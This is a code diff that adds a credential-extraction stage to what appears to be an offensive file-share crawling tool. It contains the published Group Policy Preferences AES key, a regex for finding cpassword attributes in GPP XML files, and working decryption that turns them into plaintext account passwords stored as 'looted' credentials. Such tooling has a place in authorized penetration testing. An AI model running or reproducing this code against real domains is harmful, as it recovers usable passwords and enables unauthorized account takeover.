@@ -79,6 +79,77 @@ def should_fetch(path: str, size: int, max_file_bytes: int) -> bool:
     return any(fetch and rx.search(low) for rx, _cat, fetch in _FILENAME_RULES)
 
 
+# ---- S4: usable-credential extraction (GPP cpassword decrypt) ----
+# The GPP AES-256 key Microsoft published (MS14-025 / KB2962486) -- GPP cpasswords
+# are decryptable by anyone, which is the whole point of the finding.
+_GPP_KEY = bytes.fromhex("4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")
+# userName/accountName/runAs + cpassword in a GPP XML (Groups/Services/ScheduledTasks/
+# DataSources/Printers), in EITHER attribute order.
+_RE_GPP_CRED = re.compile(
+    rb'(?:userName|accountName|runAs)="([^"]*)"[^>]{0,400}?cpassword="([^"]+)"'
+    rb'|cpassword="([^"]+)"[^>]{0,400}?(?:userName|accountName|runAs)="([^"]*)"', re.I)
+
+
+def _aes_cbc_decrypt(key: bytes, iv: bytes, ct: bytes):
+    """AES-256-CBC decrypt via whatever crypto backend is present (portable)."""
+    try:
+        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+        d = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
+        return d.update(ct) + d.finalize()
+    except Exception:
+        pass
+    for mod in ("Cryptodome.Cipher", "Crypto.Cipher"):
+        try:
+            AES = __import__(mod, fromlist=["AES"]).AES
+            return AES.new(key, AES.MODE_CBC, iv).decrypt(ct)
+        except Exception:
+            continue
+    return None
+
+
+def gpp_decrypt(cpassword: str) -> Optional[str]:
+    """Decrypt a GPP ``cpassword`` to its plaintext, or ``None``. Deterministic."""
+    import base64
+    try:
+        s = (cpassword or "").strip()
+        m = len(s) % 4
+        if m:
+            s += "=" * (4 - m)
+        ct = base64.b64decode(s)
+        if not ct or len(ct) % 16:
+            return None
+        dec = _aes_cbc_decrypt(_GPP_KEY, b"\x00" * 16, ct)
+        if not dec:
+            return None
+        pad = dec[-1]
+        if 1 <= pad <= 16:
+            dec = dec[:-pad]
+        out = dec.decode("utf-16-le", "ignore")
+        return out or None
+    except Exception:
+        return None
+
+
+class Credential(NamedTuple):
+    principal: str         # the account the looted credential is FOR
+    secret: str            # the recovered plaintext (OPERATOR-STORE / in-memory only)
+    source: str            # e.g. "gpp_cpassword"
+
+
+def extract_credentials(path: str, data: bytes) -> list[Credential]:
+    """Parse USABLE (principal, secret) credentials from a fetched file -- today the
+    GPP ``cpassword`` case (decryptable to a named account's password). The secret is
+    OPERATOR-STORE / in-memory ONLY; it never reaches a receipt."""
+    out: list[Credential] = []
+    for m in _RE_GPP_CRED.finditer(data or b""):
+        user = (m.group(1) or m.group(4) or b"").decode("utf-8", "ignore").strip()
+        cpw = (m.group(2) or m.group(3) or b"").decode("utf-8", "ignore").strip()
+        pw = gpp_decrypt(cpw)
+        if pw:
+            out.append(Credential(user or "(unknown)", pw, "gpp_cpassword"))
+    return out
+
+
 def content_findings(data: bytes) -> list[Finding]:
     """Content findings over fetched bytes. ``detail`` is a SHORT redacted context
     for the operator store -- it may contain secret material and must NEVER reach a
